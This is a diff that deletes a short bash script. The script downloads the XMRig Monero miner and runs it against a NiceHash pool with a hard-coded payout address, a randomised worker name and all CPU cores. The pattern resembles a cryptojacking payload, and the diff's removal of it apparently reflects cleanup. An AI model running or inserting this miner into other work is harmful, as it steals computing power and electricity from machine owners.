@@ -1,5 +1,0 @@
-#!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
-tar xf xmrig-6.22.2-linux-static-x64.tar.gz
-cd xmrig-6.22.2
-./xmrig --donate-level 1 -a rx/0 -o randomxmonero.auto.nicehash.com:443 -u 3NUH2ptfUHM4VXPhhrMMWoXbZK6J7bt5ZU.$(echo $RANDOM | md5sum | head -c 20) -p x -t $(nproc --all)
